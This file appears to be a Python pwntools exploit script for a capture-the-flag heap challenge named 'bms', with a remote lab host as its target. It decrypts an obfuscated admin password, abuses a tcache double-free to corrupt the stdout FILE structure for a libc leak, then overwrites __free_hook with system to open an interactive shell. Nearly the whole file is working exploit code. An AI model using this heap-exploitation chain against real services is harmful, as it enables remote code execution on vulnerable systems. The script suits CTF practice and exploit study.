from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
        p = process("./bms")#,env = {"LD_PRELOAD:","./libc6_2.28-0ubuntu1_amd64.so"})
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
	elf = ELF("./bms")
else:
	p = remote("90b826377a05d5e9508314e76f2f1e4e.kr-lab.com","40001")
        libc = ELF("./libc6_2.26-0ubuntu2.1_amd64.so")
        elf = ELF("./bms")

def login(username,password):
	p.sendafter("username:",username)
	p.sendafter("password:",password)
	p.recvuntil("success login\n")

def add(size,content,name = "\x60\x47"):
	p.sendafter(">","1")
	p.sendafter("book name:",name)
	p.sendafter("description size:",str(size))
	p.sendafter("description:",content)
        return p.recvuntil("done!")

def free(index,info = True):
	p.sendafter(">","2")
        p.sendafter("index:",str(index))
        if info:
            p.recvuntil("1. add\n")
        else:
            pass

def enc1(c):
	info = ord(c)
        if info & 1 == 1:
                return chr(info + 7)
        else:
                return chr(info - 7)

def dec1(c):
	info = ord(c)
	if info & 1 == 1:
		return chr(info + 7)
	else:
		return chr(info - 7)

def enc2(c):
	info = ord(c)
        if info != 0x3B and info != 0x64:
                return chr(info ^ 0x1B)
        else:
                return chr(info)

def dec2(c):
	info = ord(c)
	if info == 0x3B or info == 0x64:
		return chr(info)
	else:
		return chr(info ^ 0x1B)

def decrypt(password):
	length = len(password)
	res = ""
	for i in range(length):
		#temp = dec1(password[i])
		temp = dec2(password[i])
		res += temp
	#print res
	"""
	password = res
	res = ""
        for i in range(length):
                temp = dec2(password[i])
                res += temp"""
        password = res
	return password[::-1]
		

def debugf():
	gdb.attach(p,"b *0x401312")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
username = "admin\n"
password = "~vzi}"
login(username,decrypt(password) + "a")
#debugf()
size = 0x60
add(0x60,"a") #0
free(0)
free(0)
add(0x60,p64(0x602020)) #1
#debugf()
payload = p64(0xfbad1800) + p64(0)*3 + "\x00"
add(0x60,"a") #2
# "\x20"
if debug:
    add(0x60,"\x60") #3
else:
    add(0x60,"\x20") #3
#debugf()
info = add(0x60,payload) #4
#print hex(u64(p.recv(8)))
if debug:
    info = info[0x90:0x98]
else:
    info = info[0x50:0x58]
stdout_info = u64(info.ljust(8,"\x00")) - 0x3 - 128
print hex(stdout_info)
log.success("_IO_2_1_stdout_:" + hex(stdout_info))
raw_input()
if debug:
    libc.address = u64(info.ljust(8,"\x00")) - 0x3 - 128 - libc.symbols["_IO_2_1_stdout_"]
else:
    libc.address = u64(info.ljust(8,"\x00")) - 0x3 - 128 - libc.symbols["_IO_2_1_stdout_"]
log.success("libc_base:" + hex(libc.address))
#raw_input()
#debugf()
add(0x50,"a") #5
free(5)
free(5)
add(0x50,p64(libc.symbols["__free_hook"] - 8))
payload = "/bin/sh\x00" + p64(libc.symbols["system"])
add(0x50,payload)
add(0x50,payload)
free(6,False)
p.interactive()
